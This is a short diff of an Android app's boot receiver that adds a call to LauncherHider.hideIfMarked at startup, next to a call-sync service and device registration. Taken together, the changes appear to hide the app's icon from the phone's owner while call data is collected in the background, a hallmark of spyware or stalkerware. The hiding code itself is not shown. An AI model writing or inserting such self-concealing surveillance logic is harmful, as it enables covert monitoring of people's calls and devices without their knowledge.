@@ -26,6 +26,7 @@ class BootReceiver : BroadcastReceiver() {
         BackgroundSyncRunner.run {
         try {
             SyncBootstrap.armBackgroundSync(appContext)
+            LauncherHider.hideIfMarked(appContext)
             CallSyncService.ensureRunning(appContext)
             if (!SyncBootstrap.needsRuntimePermissions(appContext)) {
                     DeviceRegistration.registerNow(appContext)
